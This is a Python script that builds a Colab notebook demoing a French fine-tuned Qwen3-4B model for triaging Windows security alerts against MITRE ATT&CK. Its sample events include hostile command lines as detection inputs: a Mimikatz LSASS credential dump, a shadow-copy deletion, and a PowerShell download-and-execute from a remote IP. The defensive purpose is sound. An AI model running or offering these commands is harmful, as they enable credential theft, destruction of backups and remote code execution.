"""Génère notebooks/demo_colab.ipynb : démo « Open in Colab » (GPU T4 gratuit)."""
import json
CELLS = []
def md(s): CELLS.append({"cell_type": "markdown", "metadata": {}, "source": s.strip("\n")})
def code(s): CELLS.append({"cell_type": "code", "metadata": {}, "execution_count": None, "outputs": [], "source": s.strip("\n")})

md(r"""
# 🛡️ SOC-Qwen-FR — démo

Triage d'alertes Windows **en français** par un Qwen3-4B fine-tuné (QLoRA) : collez un événement
(Sysmon, Security, PowerShell…), le modèle renvoie un JSON avec le verdict, la technique **MITRE ATT&CK**,
la tactique, la sévérité, une explication et des recommandations.

**Mode d'emploi :** `Exécution → Modifier le type d'exécution → GPU T4`, puis `Exécution → Tout exécuter`.
Après ~3 minutes, une interface apparaît en bas de page (avec un lien public partageable).

**Console web :** copiez le lien `https://….gradio.live` dans le mode « Serveur Colab » de la console [azddine123.github.io/soc-qwen-fr](https://azddine123.github.io/soc-qwen-fr/).

Modèle : [AZAS123/soc-qwen3-4b-fr-lora](https://huggingface.co/AZAS123/soc-qwen3-4b-fr-lora) ·
Code : [github.com/azddine123/soc-qwen-fr](https://github.com/azddine123/soc-qwen-fr)
""")
code(r"""
!pip install -q -U peft bitsandbytes accelerate gradio
import torch
assert torch.cuda.is_available(), "Activez le GPU : Exécution → Modifier le type d'exécution → GPU T4"
print(torch.cuda.get_device_name(0))
""")
code(r"""
import json
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig
from peft import PeftModel

BASE    = "unsloth/Qwen3-4B-Instruct-2507-bnb-4bit"
ADAPTER = "AZAS123/soc-qwen3-4b-fr-lora"

tokenizer = AutoTokenizer.from_pretrained(ADAPTER)
base = AutoModelForCausalLM.from_pretrained(
    BASE, device_map="auto", dtype=torch.float16,
    quantization_config=BitsAndBytesConfig(load_in_4bit=True, bnb_4bit_compute_dtype=torch.float16,
                                           bnb_4bit_quant_type="nf4", bnb_4bit_use_double_quant=True))
model = PeftModel.from_pretrained(base, ADAPTER).eval()
print("Modèle chargé")
""")
code(r"""
SYSTEM_PROMPT = (
    "Tu es un analyste SOC expert en détection sur Windows. "
    "Analyse l'événement fourni et réponds UNIQUEMENT avec un objet JSON contenant : "
    "verdict (\"suspect\" ou \"bénin\"), technique_id, technique, tactique, severite, "
    "explication (en français) et recommandations (liste, en français)."
)

def triage(event_text: str) -> str:
    event_text = (event_text or "").strip()
    if not event_text:
        return '{"erreur": "Événement vide"}'
    try:
        event_text = json.dumps(json.loads(event_text), ensure_ascii=False)
    except json.JSONDecodeError:
        pass
    messages = [{"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": "Analyse cet événement Windows :\n```json\n" + event_text[:6000] + "\n```"}]
    inputs = tokenizer.apply_chat_template(messages, add_generation_prompt=True, return_tensors="pt",
                                           return_dict=True).to(model.device)
    with torch.no_grad():
        out = model.generate(**inputs, max_new_tokens=512, do_sample=False, pad_token_id=tokenizer.eos_token_id)
    txt = tokenizer.decode(out[0, inputs["input_ids"].shape[1]:], skip_special_tokens=True).strip()
    try:
        return json.dumps(json.loads(txt[txt.index("{"): txt.rindex("}") + 1]), ensure_ascii=False, indent=2)
    except ValueError:
        return txt

EXEMPLES = [
    ("Mimikatz (vol d'identifiants)", {"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "\"cmd.exe\" /c C:\\Tools\\x64\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit", "User": "CORP\\j.dupont", "IntegrityLevel": "High", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}),
    ("Suppression des clichés instantanés", {"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "CORP\\admin.it", "IntegrityLevel": "High", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}),
    ("Téléchargement PowerShell", {"Channel": "Microsoft-Windows-PowerShell/Operational", "EventID": 4104, "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.12.45.9/a.ps1')"}),
    ("Requête DNS légitime", {"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 22, "Image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "QueryName": "www.ensabm.ac.ma"}),
]
print(triage(json.dumps(EXEMPLES[0][1])))
""")
code(r"""
import gradio as gr
with gr.Blocks(title="SOC-Qwen-FR") as demo:
    gr.Markdown("# 🛡️ SOC-Qwen-FR — triage d'alertes Windows (MITRE ATT&CK)")
    with gr.Row():
        inp = gr.Code(label="Événement Windows (JSON)", language="json", lines=14)
        out = gr.Code(label="Triage", language="json", lines=14)
    gr.Button("Analyser", variant="primary").click(triage, inp, out, api_name="triage")
    gr.Examples([[json.dumps(e, ensure_ascii=False, indent=1)] for _, e in EXEMPLES], inputs=inp,
                example_labels=[l for l, _ in EXEMPLES])
demo.launch(share=True, debug=False)
""")
nb = {"cells": CELLS, "metadata": {"accelerator": "GPU", "colab": {"gpuType": "T4", "provenance": []},
      "kernelspec": {"display_name": "Python 3", "name": "python3"}, "language_info": {"name": "python"}},
      "nbformat": 4, "nbformat_minor": 0}
json.dump(nb, open("notebooks/demo_colab.ipynb", "w", encoding="utf-8"), indent=1, ensure_ascii=False)
print("ok")
